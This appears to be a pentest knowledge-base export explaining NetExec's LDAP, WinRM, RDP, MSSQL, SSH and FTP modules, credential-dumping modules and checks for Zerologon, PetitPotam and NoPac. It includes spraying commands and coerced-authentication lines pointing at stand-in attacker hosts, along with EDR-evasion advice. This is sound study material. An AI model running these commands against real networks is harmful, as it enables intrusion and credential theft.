categories.name: LDAP, WinRM, RDP, MSSQL, SSH, FTP Protocols

topics.title: LDAP Module
topics.content: The LDAP module connects to Active Directory via LDAP (port 389) or LDAPS (port 636) for comprehensive domain enumeration. LDAP is the most thorough protocol for Active Directory queries. Key capabilities: user enumeration (--users) with descriptions, group enumeration (--groups) with member counts, computer enumeration (--computers) listing all domain-joined machines, trust enumeration (--trusted-for-delegation) finding unconstrained delegation accounts, admin count (--admin-count) identifying accounts with adminCount=1 (protected accounts), password policy (--password-policy), and password-not-required finding accounts that don't require passwords. LDAP is also the protocol used for Kerberoasting (--kerberoasting) and AS-REP roasting (--asreproast). The ldap-checker module checks if LDAP signing is required, which affects relay attacks targeting LDAP. LDAP supports both NTLM and Kerberos authentication. Use -d to specify the domain explicitly. LDAP queries are generally less noisy than SMB enumeration and provide more structured data. For Kerberos auth: 'nxc ldap dc01.corp.local -k --use-kcache --users'.

topics.title: WinRM Module
topics.content: WinRM (Windows Remote Management) enables PowerShell Remoting on port 5985 (HTTP) or 5986 (HTTPS). NXC's WinRM module checks authentication and supports command execution. The (Pwn3d!) flag for WinRM means the user can execute commands via PowerShell Remoting. WinRM access requires the user to be a local administrator OR a member of the 'Remote Management Users' local group. WinRM is commonly enabled on servers but may be disabled on workstations. Output format: WINRM IP 5985 HOSTNAME [+] DOMAIN\user:password (Pwn3d!). WinRM supports both -x (cmd.exe) and -X (PowerShell) execution, as well as PTH (-H hash). WinRM is a good alternative execution path when SMB command execution is blocked or monitored. WinRM generates Event ID 4624 Type 3 and WSMan operational events (Event ID 91). For OPSEC, WinRM is moderate — it generates PowerShell and WinRM-specific logs but doesn't create services like smbexec. WinRM supports Kerberos auth (-k) for stealthier operations.

topics.title: RDP Module
topics.content: The RDP module checks Remote Desktop Protocol authentication on port 3389. The (Pwn3d!) flag means the user can successfully authenticate via RDP. NXC checks whether Network Level Authentication (NLA) is required — NLA mandates valid credentials before the full RDP connection is established. RDP can be used for password spraying against RDP services: 'nxc rdp 192.168.1.0/24 -u users.txt -p pass --continue-on-success'. The --screenshot flag captures a screenshot of the RDP session. If you have admin access via SMB but RDP is disabled, you can enable it remotely via registry modification: 'nxc smb target -u admin -p pass -x reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal\ Server /v fDenyTSConnections /t REG_DWORD /d 0 /f' and then open the firewall rule. RDP authentication generates Event ID 4624 Type 10 (RemoteInteractive) and Event ID 1149 in the TerminalServices-RemoteConnectionManager log. RDP is noisier than SMB/WinRM because it creates a full interactive session visible in task manager and user sessions.

topics.title: MSSQL Module
topics.content: The MSSQL module targets Microsoft SQL Server on port 1433. It supports both SQL authentication (local SQL accounts like sa) and Windows/domain authentication. The (Pwn3d!) flag indicates sysadmin privileges on the SQL instance. Key capabilities: SQL query execution (-q 'SELECT ...'), OS command execution via xp_cmdshell (-x 'command'), linked server enumeration and exploitation, and hash stealing via UNC path (xp_dirtree). xp_cmdshell is the most valuable feature — if you have sysadmin access, you can execute operating system commands through SQL Server. If xp_cmdshell is disabled, NXC will attempt to enable it. Common attack paths: default sa password (sa:sa or sa:<empty>), Windows auth with domain credentials that have sysadmin on the SQL instance, SQL injection escalation to xp_cmdshell. Hash stealing forces the SQL Server's service account to authenticate to your listener: 'nxc mssql target -u sa -p pass -x "EXEC xp_dirtree \\\\attacker\\share"'. Linked servers allow pivoting to other SQL instances: 'EXEC (''whoami'') AT [LINKED_SERVER]'. The mssql_priv module checks for impersonation opportunities to escalate from a low-privilege SQL login to sysadmin.

topics.title: SSH and FTP Modules
topics.content: The SSH module tests credentials against SSH services on port 22, targeting Linux/Unix systems, network devices, and appliances. SSH supports password authentication (-u user -p pass), key authentication (-u user --key-file /path/to/id_rsa), and command execution (-x 'command'). A successful SSH login does not show (Pwn3d!) — SSH access inherently provides command execution capability at the authenticated user's privilege level. SSH password spraying works the same as SMB: 'nxc ssh 192.168.1.0/24 -u users.txt -p pass --continue-on-success'. The FTP module tests FTP authentication on port 21. The most important check is anonymous access: 'nxc ftp target -u anonymous -p empty'. Anonymous FTP access may reveal sensitive files, backup archives, or deployment packages. FTP supports file listing (--ls) and password spraying. Both modules are simpler than SMB/LDAP but valuable for covering non-Windows targets in mixed environments. Network devices (routers, switches, firewalls) often expose SSH with default or weak credentials.

topics.title: NXC Module System
topics.content: NXC's module system extends its capabilities through plugins that perform specific post-exploitation tasks. Modules are invoked with -M MODULE_NAME and configured with -o OPTION=value. The -L flag lists all available modules for a protocol: 'nxc smb -L'. Each module has its own options viewable with 'nxc smb target -M module_name --options'. Modules operate within the context of the authenticated session — they require the same authentication as regular NXC commands. Key module categories: credential dumping (lsassy, mimikatz, procdump, nanodump, handlekatz), vulnerability checking (zerologon, nopac, petitpotam), enumeration (spider_plus, get_netconnections, enum_av, bloodhound), credential discovery (gpp_password, gpp_autologin, wifi, dpapi_creds, keepass_trigger), persistence and execution (empire_exec, met_inject, slinky), and system configuration (rdp, webdav, runasppl). Modules are protocol-specific — SMB modules won't work with LDAP and vice versa. The module ecosystem is community-driven with new modules added regularly. After updating NXC (pipx upgrade netexec), new modules become available.

topics.title: Key Credential Dumping Modules
topics.content: NXC provides multiple modules for extracting credentials from LSASS process memory, each with different OPSEC profiles. lsassy is the recommended module — it dumps LSASS remotely using configurable methods without dropping Mimikatz to disk. Available lsassy methods include comsvcs (uses built-in comsvcs.dll MiniDump), procdump (Microsoft's signed ProcDump utility), nanodump (stealthier using direct syscalls), dumpert (uses direct syscalls), handlekatz (handles-based approach), rdrleakdiag (abuses rdrleakdiag.exe), and wer (abuses Windows Error Reporting). The mimikatz module executes Mimikatz remotely — extremely powerful but highly detectable as the binary is signatured by every AV/EDR. procdump uses Microsoft's legitimate ProcDump tool which is signed by Microsoft (less suspicious binary but LSASS access still detected). nanodump is designed for evasion using direct syscalls to avoid API hooking, can produce obfuscated dumps, and is the best option when EDR is active. handlekatz uses handle duplication for stealthier access. Additional credential modules: dpapi_creds extracts DPAPI-protected credentials, wifi extracts saved WiFi passwords, keepass_trigger exploits KeePass trigger mechanism for credential extraction. All credential dumping modules require local admin (Pwn3d!) and generate Sysmon Event ID 10 (process access to lsass.exe).

topics.title: Vulnerability Checking Modules
topics.content: NXC includes modules for checking and exploiting critical Active Directory vulnerabilities. Zerologon (CVE-2020-1472, CVSS 10.0) allows unauthenticated domain controller compromise by exploiting a flaw in the Netlogon Remote Protocol (MS-NRPC). The zerologon module checks if a DC is vulnerable: 'nxc smb dc -u '' -p '' -M zerologon'. WARNING: The exploit changes the DC machine account password to empty, which can break domain operations — use check-only mode. PetitPotam (CVE-2021-36942) coerces authentication via the MS-EFSRPC (Encrypting File System Remote Protocol). It forces the target to authenticate to an attacker-controlled server, enabling NTLM relay attacks. Usage: 'nxc smb dc -u user -p pass -M petitpotam -o LISTENER=attacker_ip'. Combined with ntlmrelayx targeting AD CS, this achieves domain compromise. NoPac (CVE-2021-42278 + CVE-2021-42287) exploits sAMAccountName spoofing to allow any domain user to impersonate the domain controller machine account, achieving full domain compromise. The nopac module checks vulnerability: 'nxc smb dc -u user -p pass -M nopac'. These vulnerabilities are patched but commonly found in environments with poor patch management. Always check for these during internal assessments.

topics.title: NXC Database (nxcdb)
topics.content: NXC maintains a local SQLite database that automatically stores discovered hosts, credentials, and shares as you run commands. The database is accessed via the 'nxcdb' command which provides an interactive console. Key features: workspace management for separating engagements ('workspace create pentest_corp', 'workspace pentest_corp'), protocol switching ('proto smb', 'proto ldap', 'proto winrm'), querying hosts ('hosts' command shows all discovered hosts with IP, port, hostname, domain, OS, signing status), querying credentials ('creds' shows all discovered usernames, passwords, and hashes), querying shares ('shares' shows all enumerated shares), and data export ('export creds csv /tmp/creds.csv', 'export hosts csv /tmp/hosts.csv'). Each protocol has its own database file stored at ~/.nxc/workspaces/<workspace_name>/<protocol>.db. The database automatically tracks: every successful authentication (username, password/hash, target, admin access), every host discovered (IP, hostname, domain, OS, signing), every share enumerated (name, permissions), and every credential dumped. This makes nxcdb invaluable for large engagements where you need to track hundreds of credentials and hosts. You can query specific data: 'creds --domain CORP.LOCAL' or 'hosts --user administrator'.
